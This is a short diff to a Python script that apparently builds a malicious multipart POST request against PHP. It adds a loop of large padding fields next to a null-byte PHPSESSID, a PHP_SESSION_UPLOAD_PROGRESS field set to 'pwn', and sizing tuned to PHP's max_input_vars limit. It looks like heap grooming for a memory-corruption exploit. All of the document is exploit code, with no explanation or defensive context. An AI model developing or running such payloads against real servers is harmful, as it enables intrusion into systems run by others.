@@ -32,6 +32,7 @@ AQ_LEN = int(os.environ.get('AQ_LEN', '200'))
 LATE_LEN = int(os.environ.get('LATE_LEN', '0'))
 WARM_LEN = int(os.environ.get('WARM_LEN', '0'))
 W64_LEN = int(os.environ.get('W64_LEN', '0'))
+W64_N = int(os.environ.get('W64_N', '1'))
 assert F + S + NB + X + K + 2 <= 1000, "too many vars for max_input_vars=1000"
 
 BND = b'S' * 17
@@ -64,7 +65,8 @@ for _ in range(K):
     parts.append((str(idx), None, b'T' * KL))
     idx += 1
 if W64_LEN > 0:
-    parts.append(('999996', None, b'z' * W64_LEN))
+    for _wi in range(W64_N):
+        parts.append(('9999%02d' % (90 + _wi), None, b'z' * W64_LEN))
 parts.append(('PHPSESSID', None, b'\x00'))
 parts.append(('PHP_SESSION_UPLOAD_PROGRESS', None, b'pwn'))
 parts.append((FN, 'A' * 99 + '.txt', b'A' * 64))
